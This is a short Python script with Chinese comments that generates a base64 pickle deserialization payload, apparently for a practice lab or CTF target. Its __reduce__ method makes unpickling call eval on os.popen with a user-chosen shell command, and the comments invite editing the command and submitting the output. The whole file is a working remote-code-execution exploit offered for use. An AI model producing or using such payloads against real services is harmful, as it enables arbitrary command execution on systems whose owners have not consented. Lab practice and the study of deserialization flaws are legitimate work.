# -*- coding: utf-8 -*-
"""反序列化 payload 生成器：改 cmd 里的命令，跑完复制输出的 base64 提交到靶场"""
import pickle, base64

cmd = "whoami"  # ← 改成你想执行的命令

class Exploit:
    def __reduce__(self):
        # 还原时执行 eval("__import__('os').popen('<cmd>').read()")
        return (eval, ("__import__('os').popen('%s').read()" % cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
